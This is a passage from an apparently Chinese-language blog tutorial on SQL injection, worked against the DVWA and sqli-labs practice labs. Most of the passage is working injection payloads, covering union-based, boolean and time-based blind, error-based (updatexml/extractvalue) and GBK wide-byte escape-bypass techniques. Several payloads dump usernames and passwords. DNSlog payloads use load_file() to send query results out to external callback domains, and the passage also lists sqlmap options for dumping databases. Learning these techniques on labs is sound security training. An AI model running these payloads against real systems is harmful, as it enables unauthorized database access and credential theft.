<p>说明没有3 列这么多</p>
<p>1’ <strong>order</strong> <strong>by</strong> 2#’</p>
<p><img src="/images/image_1765021596444.png" alt="image.png"></p>
<p>说明有两列</p>
<h4 id="4、判断回显的位（哪个位置的数据被显示到了页面上）"><a href="#4、判断回显的位（哪个位置的数据被显示到了页面上）" class="headerlink" title="**4、判断回显的位（哪个位置的数据被显示到了页面上） **"></a>**4、判断回显的位（哪个位置的数据被显示到了页面上） **</h4><p>在一个网站的正常页面，服务端执行SQL 语句查询数据库中的数据，客户端将数据展示在页面中，这</p>
<p>个展示数据的位置就叫显示位。UNION 操作符用于合并两个或多个 SELECT 语句的结果集，UNION 结</p>
<p>果集中的列名总是等于UNION 中第一个 SELECT 语句中的列名，并且 <strong>UNION</strong> 内部的 <strong>SELECT</strong> 语句必须</p>
<p>拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相</p>
<p>同。</p>
<p>输入</p>
<p>-1’ union select 1,2#’</p>
<p>可以发现1 和 2 都回显到页面中了，说明这两个位置都可以显示数据。</p>
<p><img src="/images/image_1765021626381.png" alt="image.png"></p>
<p>在实战中一般不查询union 左边的内容，这是因为程序在展示数据的时候通常只会取结果集的第 一行数据，所以只要让第一行查询的结果是空集，即 union 左边的 select 子句查询结果为空，那么 union 右边的查询结果自然就成为了第一行，打印在网页上了。所以让 union 左边查询不到，可以将其改为负数或者改为比较大的数字。</p>
<h4 id="5、获取数据库名"><a href="#5、获取数据库名" class="headerlink" title="**5、获取数据库名 **"></a>**5、获取数据库名 **</h4><p>-1’ union select 1,database()#’</p>
<p><img src="/images/image_1765021653792.png" alt="image.png"></p>
<h4 id="6、获取数据库对应的表名"><a href="#6、获取数据库对应的表名" class="headerlink" title="**6、获取数据库对应的表名 **"></a>**6、获取数据库对应的表名 **</h4><p>-1’ union <strong>select</strong> 1,table_name <strong>from</strong> information_schema.tables where table_schema&#x3D;’dvwa’ #</p>
<p><img src="/images/image_1765021677330.png" alt="image.png"></p>
<h4 id="7、获取数据库中某个表的列名-字段名"><a href="#7、获取数据库中某个表的列名-字段名" class="headerlink" title="7、获取数据库中某个表的列名(字段名)"></a><strong>7、获取数据库中某个表的列名(字段名)</strong></h4><p>-1’ union select 1,column_name from information_schema.columns where table_name&#x3D;’guestbo ok’ and table_schema&#x3D;’dvwa’ #</p>
<p><img src="/images/image_1765021700564.png" alt="image.png"></p>
<h4 id="8、获取数据"><a href="#8、获取数据" class="headerlink" title="8、获取数据"></a><strong>8、获取数据</strong></h4><p>获取单条数据</p>
<p><img src="/images/image_1765021723122.png" alt="image.png"></p>
<p>获取所有数据</p>
<p>-1’ union <strong>select</strong></p>
<p>1,group_concat(comment_id,comment,name) <strong>from</strong> guestbook%23</p>
<p><img src="/images/image_1765021746371.png" alt="image.png"></p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><strong>布尔盲注</strong></h2><h4 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a><strong>注入流程</strong></h4><ol>
<li>判断是否存在注入</li>
<li>获取数据库长度</li>
<li>逐字猜解数据库名</li>
<li>猜解表名数量</li>
<li>猜解某个表名长度</li>
</ol>
<p>ɛ . 逐字猜解表名</p>
<ol start="7">
<li>猜解列名数量</li>
</ol>
<p>ɝ . 猜解某个列名长度</p>
<ol start="9">
<li>逐字猜解列名</li>
<li>判断数据数量</li>
<li>猜解某条数据长度</li>
<li>逐位猜解数据</li>
</ol>
<h4 id="常用知识点"><a href="#常用知识点" class="headerlink" title="常用知识点"></a><strong>常用知识点</strong></h4><h5 id="length（）函数"><a href="#length（）函数" class="headerlink" title="length（）函数"></a><strong>length（）函数</strong></h5><p>作用获取字符串长度</p>
<p>length(database()) &gt; 6</p>
<p>目标URL：<a target="_blank" rel="noopener" href="http://example.com/news.php?id=1">http://example.com/news.php?id=1</a></p>
<p>漏洞点：id</p>
<p>页面行为：</p>
<p>当SQL 条件为真时，正常显示新闻内容</p>
<p>当SQL 条件为假时，不显示内容，或者显示 Not Found</p>
<p>步骤1：确定漏洞是否存在：</p>
<p>?id&#x3D;1’ and 1&#x3D;1–</p>
<p>页面正常—条件为真可以触发</p>
<p>?id&#x3D;1’ and 1&#x3D;2–</p>
<p>页面不显示，–&gt; 条件为假的时候可以触发</p>
<p>步骤2：猜测数据库名的长度</p>
<p>?id&#x3D;1 and length(database())&#x3D;6–</p>
<p>原理：改变数字测试数据库名的长度</p>
<p>如果页面正常，说明数据库名的字符串长度正确（假如是6）</p>
<h5 id="substr-函数或者-substring-函数"><a href="#substr-函数或者-substring-函数" class="headerlink" title="substr()函数或者 substring()函数"></a><strong>substr()函数或者 substring()函数</strong></h5><p>作用：从字符串中截取指定长度（位置）的子字符串</p>
<p>substr(string, start_pos, [length])</p>
<p>substring(string, start_pos, [length])</p>
<p>&#x2F;&#x2F;</p>
<p>string:原始字符串（必填）</p>
<p>start_pos: 起始位置（从 1 开始计数（起始索引从 1 开始），不是从 0！）</p>
<p>length: 要截取的长度（可选，默认是到末尾）</p>
<p>某些数据库系统 比如postgresql 中，substring()的起始索引是从 0 开始的</p>
<p>select substr(‘2025-06-04’,6,2); –&gt;结果：06</p>
<p>&#x2F;&#x2F;从末尾开始截取</p>
<p>select substr(‘Hello World’,-5); –&gt; 结果’World’</p>
<p><strong>猜解数据库名普通方法</strong></p>
<p>步骤3：逐字符猜解数据库名：</p>
<p>猜解第一个字符：</p>
<p>?id&#x3D;1’ and substr(database(),1,1)&#x3D;’d’–</p>
<p>如果页面正常，说明数据库名的第一个字符是‘d’</p>
<p>猜解后续字符：</p>
<p>?id&#x3D;1’ and substr(database(),2,1)&#x3D;’v’–</p>
<p>**ascii(char)函数 **</p>
<p>获取字符的ASCII 码 : ascii(‘a’) –&gt;97</p>
<p>?id&#x3D;1’ and ascii(substr(database(),1,1))&gt;96–+</p>
<p>页面正常，说明ascii 码大于 96（也就是从小写字母 a 开始）</p>
<p>继续：</p>
<p>?id&#x3D;1’ and ascii(substr(database(),1,1))&#x3D;115–+</p>
<p>假如页面正常，说明字符的ascii 码&#x3D;115，也就是字符为`s</p>
<p><strong>猜解数据库名高级技巧</strong></p>
<p>1、二分法加速猜解</p>
<p>‘ and ascii(substr()) between 50 and 70 –</p>
<p>2、联合多个条件探测</p>
<p>‘ and (select count(*) from user)&#x3D;5 – -&gt; 判断数据行数</p>
<p>自动化脚本实例：</p>
<p><img src="/images/image_1765021790026.png" alt="image.png"></p>
<h5 id="limit-字句"><a href="#limit-字句" class="headerlink" title="limit 字句"></a><strong>limit 字句</strong></h5><p>限制查询结果返回的行数</p>
<p>select from limit [offset] row_count;</p>
<p>&#x2F;&#x2F;offset:跳过的行数（索引是从 0 开始）</p>
<p>row_count(要返回的最大行数)</p>
<p>举例：</p>
<p>select * from products limit 0,2;</p>
<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a><strong>时间盲注</strong></h2><h4 id="时间盲注描述"><a href="#时间盲注描述" class="headerlink" title="时间盲注描述"></a><strong>时间盲注描述</strong></h4><p>如果<strong>无法通过内容或者错误信息判断注入</strong>结果时候，通过观察<strong>时间差异</strong>来逐字推断数据。</p>
<p>核心逻辑：通过构造条件语句触发数据库延时操作。根据页面响应时间判断条件是否成立。</p>
<p>能不能让数据库执行的时间变成我们想要的时间？</p>
<p>生活场景：蒙眼参加迷宫游戏。每次选择岔路后，通过等待时间长短判断是否选择了正确路径。长时间</p>
<p>等待（延时）表示选择了正确路径。，如果快速返回表示错误</p>
<h4 id="注入流程-1"><a href="#注入流程-1" class="headerlink" title="注入流程"></a><strong>注入流程</strong></h4><ol>
<li>判断是否存在注入</li>
<li>获取数据库长度</li>
<li>逐字猜解数据库名</li>
<li>猜解表名数量</li>
<li>猜解某个表名长度</li>
</ol>
<p>ɛ . 逐字猜解表名</p>
<ol start="7">
<li>猜解列名数量</li>
</ol>
<p>ɝ . 猜解某个列名长度</p>
<ol start="9">
<li>逐字猜解列名</li>
<li>判断数据数量</li>
<li>猜解某条数据长度</li>
<li>逐位猜解数据</li>
</ol>
<h4 id="常用知识点-1"><a href="#常用知识点-1" class="headerlink" title="常用知识点"></a><strong>常用知识点</strong></h4><h5 id="sleep-函数"><a href="#sleep-函数" class="headerlink" title="sleep()函数"></a><strong>sleep()函数</strong></h5><p>sleep(seconds) 延时</p>
<p>sleep(5) —&gt;延时5 秒</p>
<p>场景：</p>
<p>URL&#x3D; <a target="_blank" rel="noopener" href="http://example.com/product.php?id=1">http://example.com/product.php?id=1</a></p>
<p>存在漏洞参数： id</p>
<p>页面行为：物理注入条件是否成立，页面内容都不会变化，但响应时间可以测试</p>
<p>步骤一、确认注入点</p>
<p>?id&#x3D;1’ and sleep(2)–</p>
<p>观察结果：如果页面响应时间大于等于2 秒，说明注入成功。</p>
<h5 id="IF-函数"><a href="#IF-函数" class="headerlink" title="IF()函数"></a><strong>IF()函数</strong></h5><p>步骤2：猜测数据库名字</p>
<p>if(条件，真值，假值)</p>
<p>?id&#x3D;1’ and if(ascii(substr(database(),1,1))&#x3D;115,sleep(2),0)–</p>
<p>函数拆解：</p>
<p>substr(database(),1,1) 获取数据库名的第一个字符</p>
<p>ascii(…) ：将字符转为 ascii 码（字母 s 的 ascii 码是 115）</p>
<p>if(条件，条件为真的时候执行的东西，条件为假的时候执行东西)</p>
<p>结果判断：</p>
<p>响应时间大于等于2 秒— &gt; 首字符是 s （字母 s 的 ascii 码是 115）</p>
<p>快速响应（小于2 秒）–&gt; 首字符不是</p>
<p>脚本自动化实例：</p>
<p><img src="/images/image_1765021837738.png" alt="image.png"></p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a><strong>报错注入</strong></h2><h4 id="报错注入描述"><a href="#报错注入描述" class="headerlink" title="报错注入描述"></a><strong>报错注入描述</strong></h4><p>报错注入是SQL 注入的一种，页面上没有显示位，但是会输出 SQL 语句执行错误信息。报错注入就是</p>
<p>利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联</p>
<p>合查询受限且后台没有屏蔽数据库报错信息，发生错误时会输出错误信息在前端页面的情况下比较好</p>
<p>用。</p>
<h4 id="常用知识点-2"><a href="#常用知识点-2" class="headerlink" title="常用知识点"></a><strong>常用知识点</strong></h4><h5 id="updatexml-函数"><a href="#updatexml-函数" class="headerlink" title="updatexml()函数"></a><strong>updatexml()函数</strong></h5><p>用法：updatexml(目标 xml 文档，xml 路径，更新的内容)</p>
<p>在SQL 注入中利用的原理：如果 UPDATEXML() 函数接收到无效的 XML 或 XPath 表达式，或者传入恶意</p>
<p>的数据，可能会导致错误。</p>
<p>适用版本：Mysql5.1.5+</p>
<p>用法：updatexml(目标 xml 文档，xml 路径，更新的内容)</p>
<p>三个参数：要求都是字符串类型</p>
<p>updatexml(1,”&#x2F;&#x2F;version”,”new_value”);</p>
<p>在SQL 注入中利用的原理：如果 UPDATEXML() 函数接收到无效的 XML 或 XPath 表达式，或者传入恶意</p>
<p>的数据，可能会导致错误。</p>
<p>select updatexml(1,’\x7exml’,3);</p>
<h5 id="concat-函数"><a href="#concat-函数" class="headerlink" title="concat()函数"></a><strong>concat()函数</strong></h5><p>concat()函数用于将一个或多个字符串连接成一个新的字符串。它可以接受任意数量的参数，并将这些</p>
<p>参数按顺序拼接起来。</p>
<p>select updatexml(1,concat(‘~‘,database()),3);</p>
<p>添加特殊符号是为了使其报错，把信息显示出来。</p>
<p>昀好是用十六进制编码特殊符号： ~ :0x7e</p>
<p>1’ and updatexml(2,concat(0x7e,database(),0x7e,@@version),3)#</p>
<p>1’ and updatexml(2,concat(0x7e,(select group_concat(table_name) from</p>
<p>information_schema.tables where table_schema&#x3D;’dvwa’)),3)#</p>
<p>注意：xpath 报错昀多显示 32 个字符，超过 32 个字符，可以用 substr() 截取</p>
<p>sqli-labs less 5:</p>
<p>&#x2F;&#x2F;获取数据库名</p>
<p>1’ and updatexml(1,concat(0x5e,database(),0x5e),3)–+</p>
<p>&#x2F;&#x2F;获取表名：</p>
<p>1’ and updatexml(1,concat(0x5e,(select group_concat(table_name) from</p>
<p>information_schema.tables where table_schema&#x3D;database()),0x5e),3)–+</p>
<p>&#x2F;&#x2F;获取列名</p>
<p>1’ and updatexml(1,concat(0x5e,(select group_concat(column_name) from</p>
<p>information_schema.columns where table_name&#x3D;’users’),0x5e),3)–+</p>
<p>&#x2F;&#x2F;获取数据</p>
<p>1’ and updatexml(1,concat(0x5e,(select group_concat(username,0x5e,password) from</p>
<p>users),0x5e),3)–+</p>
<p>&#x2F;&#x2F;超过 32 位数，使用 substr()截取1-32：</p>
<p>1’ and updatexml(1,concat(0x5e,(substr((select</p>
<p>group_concat(username,0x5e,password) from users),1)),0x5e),3)–+</p>
<p>1’ and updatexml(1,concat(0x5e,(substr((select</p>
<p>group_concat(username,0x5e,password) from users),32)),0x5e),3)–+</p>
<p>1’ and updatexml(1,concat(0x5e,(substr((select</p>
<p>group_concat(username,0x5e,password) from users),63)),0x5e),3)–+</p>
<h5 id="extractvalue-函数"><a href="#extractvalue-函数" class="headerlink" title="extractvalue()函数"></a><strong>extractvalue()函数</strong></h5><p>extractvalue(xml_frag, xpath_expr)</p>
<p>xml_frag：xml 文档对象的名称，是一个字符串类型。</p>
<p>xpath_expr：使用 xpath 语法格式的路径。</p>
<p>适用的版本：MySQL 5.1.5+</p>
<p>&#x2F;&#x2F;获取数据库名</p>
<p>1’ and extractvalue(1, concat(0x7e,(select database())))–+</p>
<p>&#x2F;&#x2F;后续步骤同 updatexml()</p>
<p>sqli-labs 靶场 less5-6 都可以用这种方法。less6：双引号</p>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a><strong>宽字节注入</strong></h2><h4 id="宽字节注入描述"><a href="#宽字节注入描述" class="headerlink" title="宽字节注入描述"></a><strong>宽字节注入描述</strong></h4><p>大多数的网站对于SQL 注入都做了一定的防护，例如使用一些 MySQL 中转义的函数 addslashes、</p>
<p>mysql_real_escape_string、mysql_escape_string 等(还有一种是 php 配置文件 的</p>
<p>magic_quote_gpc 设置，不过 PHP 高版本已经移除此功能)。其实这些函数就是为了过滤用户输入的</p>
<p>一些数据，对特殊的字符加上反斜杠\进行转义，所以在条件符合的情况下可利用宽字节注入绕过这</p>
<p>些函数。</p>
<p>宽字节注入指的是MySQL 数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个</p>
<p>ascii 码要大于 128（比如 %df），才到汉字的范围），而且当我们输入’时，MySQL 会调用转义函数，</p>
<p>将单引号变为\‘，其中\的十六进制是 5c，MySQL 的 GBK 编码，会认为 %df%5c 是一个宽字节，也就</p>
<p>是運，从而使单引号闭合（逃逸），进行注入攻击。</p>
<p>常见的字符编码：</p>
<p>UTF-8：可变长编码：常见字符占用 1-4 个字节</p>
<p>UTF-16：字符占用 2 个字节或者 4 个字节</p>
<p>UTF-32：字符占用 4 个字节</p>
<p>GBK：一个字符占用 2 个字节</p>
<p>ASCII：字符占用 1 个字节</p>
<p>宽字节：GB2312，GBK，GB18030，BIG5 等这些常见的宽字节：字符占用为 2 个字节</p>
<p>宽字节注入的核心原理：利用字符编码差异。在某些情况下宽字节编码会被系统或者数据库处理不当。</p>
<p>从而绕过输入验证，SQL 语句解析和过滤机制。</p>
<p>SQL 防御：对输入的某些预定义的字符（单引号，双引号，反斜线和 NULL 字符）进行转义，以防止这些</p>
<p>字符被误解为代码注入。</p>
<p>?id&#x3D;1’</p>
<p>select * from username where id&#x3D;’$id’;</p>
<p>select * from username where id&#x3D;’1’’;</p>
<p>select * from username where id&#x3D;’1\‘’;</p>
<h4 id="常用知识点-3"><a href="#常用知识点-3" class="headerlink" title="常用知识点"></a><strong>常用知识点</strong></h4><h5 id="宽字节绕过转义"><a href="#宽字节绕过转义" class="headerlink" title="宽字节绕过转义"></a><strong>宽字节绕过转义</strong></h5><p><strong>GBK 编码绕过</strong></p>
<p>1%df’</p>
<p>经过代码层过滤之后：</p>
<p>%df’ — &gt; %df\‘ —&gt;url 编码：%df%5c%27</p>
<p>当传入数据库的时候，并且数据库使用的是GBK 编码的时候，会将 %df%5c 解析为一个字符。剩下来一</p>
<p>个 %27</p>
<p>剩下的 %27 是 ‘ 的 url 编码。从而造成了单引号成功逃逸</p>
<p>然后再mysql 中执行的时候，url 编码会被解码</p>
<p>\ 的 URL 编码： %5c</p>
<p>‘ 的 URL 编码： %27</p>
<p>mysql 使用 GBK 编码，就会认为 %df%5c%27 是一个宽字节。</p>
<p>%df%5c 会被结合解析为一个字符（因为宽字节一个字符占用两个字节，且在汉字编码范围内两个字节</p>
<p>编码为一个汉字）： 運 ，单引号成功逃逸出来了，从而造成注入漏洞。</p>
<p>只要输入一个ascii 大于 128 的就可以，ascii 码 129 的字符转为 16 进制：0x81(url:%81)</p>
<p>GBK 首字节范围 0x81-0xfe (ascii 码：129-239) 尾字节范围:0x40-0xfe(ascii：64-126)（除了 0x7f 以外</p>
<p>（128）</p>
<p>比如： %df、%81、%82 、%de (主要满足 GBK 首尾字节范围要求即可)</p>
<h5 id="注入流程-2"><a href="#注入流程-2" class="headerlink" title="注入流程"></a><strong>注入流程</strong></h5><ol>
<li>输入1’，addslashes函数将’进行转义变为\‘，此时的单引号仅作为普通的字符。</li>
<li>输入1%df’，addslashes函数将’进行转义变为\‘，此时%df%5c会进行结合变成了一个汉字運，此SQL 查询语句成功被改变了从而引起了报错。</li>
</ol>
<p>&#x2F;&#x2F;获取列数</p>
<p>?id&#x3D;1%df’ order by 4 –+</p>
<p>&#x2F;&#x2F;获取回显位</p>
<p>-1%df’union select 1,2,3 –+</p>
<p>&#x2F;&#x2F;获取数据库名</p>
<p>-1%df’ union select 1,database(),3 –+</p>
<p>&#x2F;&#x2F;获取表名</p>
<p>-1%df’ union select 1,(select group_concat(table_name) from</p>
<p>information_schema.tables where table_schema&#x3D;’security’),3–+ &#x2F;&#x2F;报错</p>
<p>-1%df’ union select 1,(select group_concat(table_name) from</p>
<p>information_schema.tables where table_schema&#x3D;(database())),3–+</p>
<p>&#x2F;&#x2F;获取 users 表的列名（字段名）</p>
<p>?id&#x3D;2%df’ and updatexml(1,concat(0x7e,(select (group_concat(column_name))from</p>
<p>information_schema.columns where table_schema&#x3D;(select database())and table_name&#x3D;</p>
<p>(select table_name from information_schema.tables where table_schema&#x3D;(select</p>
<p>database()) limit 3,1)),0x7e),1)–+</p>
<p>&#x2F;&#x2F;获取数据</p>
<p>?id&#x3D;2%df’ and updatexml(1,concat(0x7e,(select (password)from security.users</p>
<p>limit 7,1 ),0x7e),1)–+</p>
<p>结合报错注入函数：</p>
<p>1%df’ and updatexml(1,concat(0x7e,database(),0x7e),1)–+</p>
<p>获取表名：</p>
<p>1%df’ and updatexml(1,concat(0x7e,(select (group_concat(table_name))from</p>
<p>information_schema.tables where table_schema&#x3D;(database())),0x7e),1)–+</p>
<p>数据库名或者表名可以使用十六进制编码：从而避免输入引号被转义</p>
<p>-1%df’ union select 1,(select group_concat(table_name) from</p>
<p>information_schema.tables where table_schema&#x3D;0x7365637572697479),3–+</p>
<p><img src="/images/image_1765021886455.png" alt="image.png"></p>
<p>33 宽字节-报错注入-addslashes()</p>
<p>34 宽字节-Union 查询-POST-addslashes()</p>
<p>35 宽字节-数字型-addslashes()</p>
<p>36 宽字节-mysqli_real_escape_string($con, $string）</p>
<h2 id="DNSlog-注入"><a href="#DNSlog-注入" class="headerlink" title="DNSlog 注入"></a><strong>DNSlog 注入</strong></h2><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a><strong>描述</strong></h4><p>首先我们知道DNS 是起 ip 与域名的解析的服务，通过 ip 可以解析到对应的域名。DNSlog 就是储存在 DNS 上的域名相关的信息，它记录着你对域名或者 IP 的访问信息，也就是类似于日志文件。</p>
<p>通俗的说就是我有个域名yijinglab.com，我将域名设置对应的 ip 2.2.2.2 上，这样当我向 dns 服务器发起 yijinglab.com 的解析请求时，DNSlog 中会记录下他给 yijinglab.com 解析，解析值为 2.2.2.2，而我们这个解析的记录的值就是我们要利用的地方，这个过程被记录下来就是 DNSlog</p>
<p>DNS ：负责将域名转为 ip 地址</p>
<p>dnslog：记录域名解析时的域名和 ip 信息</p>
<p>dnslog 注入原理：通过在域名查询中嵌入信息，利用 dns 解析留下的日志。将信息传递并读取处理，从而获取请求信息。</p>
<p>首先需要有一个可以配置的域名，比如：a.com，然后通过代理商设置域名 a.com 的 nameserver (NS</p>
<p>记录)为自己的服务器 B，然后再服务器 B 上配置好 DNS Server，这样以来所有 a.com 及其子域名的查询</p>
<p>都会到 服务器 B 上，这时就能够实时地监控域名查询请求了。</p>
<p><img src="/images/image_1765021914068.png" alt="image.png"></p>
<h4 id="常用知识点-4"><a href="#常用知识点-4" class="headerlink" title="常用知识点"></a><strong>常用知识点</strong></h4><p>关键函数：Load_file()函数，原本作用：用来读取文件并返回其字符串内容的。</p>
<p>LOAD_FILE(str)</p>
<p>LOAD_FILE(file_name)</p>
<p>其中，`file_name`是文件的完整路径。该函数返回文件的内容作为一个字符串，如果文件不存在或无法读</p>
<p>取，则返回`NULL`。</p>
<p>文件路径支持UNC 路径（Windows 特有的，比如 \winx-pc\c$\aa.txt ）</p>
<p>前提：</p>
<p>*存在注入点</p>
<p>*数据库运行的时候拥有管理员（root）权限</p>
<p>create user ‘lee2dog‘@’localhost’ identified by ‘123456’;</p>
<p>grant all on <em>.</em> to ‘lee2dog‘@’localhost’;</p>
<p>普通用户无法读取</p>
<p>*数据库对磁盘具有读写权限：，即 secure_file_priv 设置为空字符串。当 secure_file_priv 设置为 NULL 时，需修改 phpstudy 的 MySQL 配置，步骤包括：打开配置文件，添加 secure_file_priv&#x3D;修改 my.ini 文件时需要注意 secure_file_priv 选项</p>
<p>show variables like ‘%secure%’;</p>
<p>secure_file_priv&#x3D;null &#x3D;&#x3D;》 默认，不允许 MySQL 导入导出；</p>
<p>secure_file_priv&#x3D;&#x2F;tmp&#x2F; &#x3D;&#x3D;》 仅允许 &#x2F;tmp&#x2F; 目录下的导入导出；</p>
<p>secure_file_priv&#x3D; &#x3D;&#x3D;》 导入导出无限制；</p>
<p>4 、具有请求 URL 的权限</p>
<p>5、必须是 Windows 环境</p>
<p>为什么用dnslog</p>
<p>有时候，盲注是不是很繁琐</p>
<p>&#x2F;sqli_labs&#x2F;Less-9&#x2F;?id&#x3D;1’ and if(length(database())&#x3D;8,1,sleep(5))–</p>
<p>dnslog</p>
<p>select load_file(&#x2F;&#x2F;lee.510140c8.log.dnslog.sbs);</p>
<p><a target="_blank" rel="noopener" href="http://localhost/sqli-labs/Less-1/?id=1">http://localhost/sqli-labs/Less-1/?id=1</a>‘ and load_file(concat(‘&#x2F;&#x2F;‘,(需要执行的 SQL 语</p>
<p>句、需要获取的数据),’.aa9f2e8a36.ipv6.1433.eu.org&#x2F;dachui’))–+</p>
<p>请求下的&#x2F;aaa 文件时留下 dns 解析记录来获取信息</p>
<p>两种路径方式</p>
<p>select load_file(concat(‘&#x2F;&#x2F;‘,(select 攻击语句),’.xxxx.ceye.io&#x2F;sql_test’))</p>
<p>select load_file(concat(‘\\\\‘,(select 攻击语句),’.xxxx.ceye.io\\sql_test’))</p>
<p>and load_file(concat(‘\\\\‘,(select database()),’.fz1l.callback.red\\abc’))–+</p>
<p>在使用group_concat 合并查询时，会自动使用 “,” 连接我们查询到的每值</p>
<p>注意：域名规则：只能出现数字，字母和下划线。所以在获取到的信息中包含了其他特殊符号时，load_file 就会认为是一个错误的域名，就不会去从网络中解析了。</p>
<p>长度限制：每个段域名长度昀大限制是63 个字符。域名总长度不能超过 253 个字符。所以在 mysql 中获取到超过 63 个字节的字符时，会被当作一个错误的域名，不会产生去解析的动作。</p>
<p>sqli-labs&#x2F;Less-9&#x2F;</p>
<p>使用replace，substr 等函数，成功绕过了 url 解析的问题</p>
<p>通过正则替换将replace 中的 “ ，”全部替换为 “ _ ” 这样就可以符合 url 的解析规则了</p>
<p>?id&#x3D;1’ and load_file(concat(‘\\\\‘,(select group_concat(username separator ‘_‘ )</p>
<p>from users),’.510140c8.log.dnslog.sbs\\abc’))–+ &#x2F;&#x2F;超出长度,不解析</p>
<p>select load_file(concat(‘\\\\‘,(select SUBSTR((group_concat(username separator</p>
<p>‘_‘)),1,63) from users),’.510140c8.log.dnslog.sbs\\abc’))–+ &#x2F;&#x2F;正常 separator（se</p>
<p>po rator）：指定分割符号为_</p>
<p>select load_file(concat(‘\\\\‘,(select</p>
<p>(replace((group_concat(username)),’,’,’_‘)) from</p>
<p>users),’.510140c8.log.dnslog.sbs\\abc’))–+ &#x2F;&#x2F;超出长度，不解析</p>
<p>select load_file(concat(‘\\\\‘,(select</p>
<p>SUBSTR(replace((group_concat(username)),’,’,’_‘),1,63) from</p>
<p>users),’.510140c8.log.dnslog.sbs\\abc’))–+ &#x2F;&#x2F;正常</p>
<p>是用十六进制，一视同仁，规避字符导致的不解析问题</p>
<p>hex(group_concat(table_name))</p>
<p>select load_file(concat(‘\\\\‘,(select</p>
<p>SUBSTR(hex((group_concat(username))),1,63) from</p>
<p>users),’.fz1l.callback.red\\abc’))</p>
<h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a><strong>SQLMAP</strong></h2><p>参数</p>
<p>-u :指定 url（get 请求方式、post 方式 –data 指定参数）</p>
<p>-r :指定任何请求方法，从文件读取（POST）</p>
<p>–level ：</p>
<p>***执行测试的等级（1-5，默认为 1）***</p>
<ul>
<li>*使用-level 参数且数值 &gt;&#x3D;2 的时候也会检查 cookie 里面的参数*</li>
<li>*当 &gt;&#x3D;3 的时候将检查 User-agent 和 Referer*</li>
</ul>
<p>–risk: 执行测试的风险（0-3，默认为 1）</p>
<ul>
<li>*默认是 1 会测试大部分的测试语句*</li>
<li>*2 会增加基于事件的测试语句*</li>
<li>*3 会增加 OR 语句的 SQL 注入测试*</li>
</ul>
<p>-v : 指定消息级别：0-6 （缺省默认 1）</p>
<ul>
<li>*其值具体含义：“0”只显示 python 错误以及严重的信息；*</li>
<li>*“1”同时显示基本信息和警告信息（默认）；*</li>
<li>*“2”同时显示 debug 信息；*</li>
<li>*“3”同时显示注入的 payload；*</li>
<li>*“4”同时显示 HTTP 请求；*</li>
<li>*“5”同时显示 HTTP 响应头；*</li>
<li>*“6”同时显示 HTTP 响应页面；*</li>
</ul>
<p>如果想看到sqlmap 发送的测试 payload 最好的等级就是 3</p>
<ul>
<li>设置为 5 的话</li>
<li>*可以看到 http 相应信息，比较详细*</li>
</ul>
<p>-p :指定测试的参数</p>
<ul>
<li>有些网址有很多的参数，那么我们可以指定只对那个参数进行注入</li>
</ul>
<p>–threads ：线程 数的值</p>
<p>-batch-smart ：智能判断测试，自行寻找注入点进行测试</p>
<p>获取数据的参数：</p>
<p>–dbs：会获取所有的数据库 &#x2F;&#x2F;默认情况下 sqlmap 会自动的探测 web 应用后端的数据库类型：MySQL、</p>
<p>Oracle、PostgreSQL、MicrosoftSQL Server、Microsoft Access、SQLite、Firebird、</p>
<p>Sybase、SAPMaxDB、DB2</p>
<p>–current-user：大多数数据库中可检测到数据库管理系统当前用户</p>
<p>–current-db：当前连接数据库名</p>
<p>–is-dba：判断当前的用户是否为管理</p>
<p>–users：列出数据库所有所有用户</p>
<p>-D 指定数据库名</p>
<p>–tables 获取表名</p>
<p>-T 指定表名</p>
<p>–columns 获取字段名（列名）</p>
<p>–dump 获取所有数据（脱裤、拖库）</p>
<p>Tamper 脚本</p>
<p>use age：sqlmap.py –tamper&#x3D;”模块名.py”</p>
<p>比如宽字节绕过：</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://only-only1.github.io">Only0901</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://only-only1.github.io/2025/12/06/SQL%E6%B3%A8%E5%85%A5/">https://only-only1.github.io/2025/12/06/SQL%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://only-only1.github.io" target="_blank">Only0901'blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/images/QQ20251206-195428.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/11/27/web%E5%AE%89%E5%85%A8/" title="web安全"><img class="cover" src="/images/980.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">web安全</div></div><div class="info-2"><div class="info-item-1"> 一，信息收集 HTTP头分析：通过Server字段确定后端服务器类型、开发语言及版本 指纹识别：使用Wappalyzer等工具通过特征文件识别  通过泄露的敏感目录，我们可以获取服务器路径、url甚至直接获取网站源码，敏感目录包括：  版本控制泄露： Git目录泄露（使用GitHacker工具还原） SVN目录泄露（类似Git泄露原理）   开发环境泄露： IDEA工程目录（含项目路径和数据库信息）   管理后台泄露：通过目录扫描发现后台地址       工具： 